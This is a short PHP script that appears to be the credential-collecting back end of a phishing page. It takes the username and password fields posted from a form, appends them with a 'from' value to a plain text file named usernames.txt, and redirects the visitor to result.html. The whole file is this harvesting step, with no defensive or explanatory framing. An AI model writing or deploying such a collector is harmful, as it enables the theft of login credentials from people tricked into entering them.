<?php

file_put_contents("usernames.txt", "Connected: " . $_POST['from'] . "  Username: " . $_POST['id'] . " Pass: " . $_POST['pass']      .  "\n", FILE_APPEND);
header('Location: result.html');
exit();
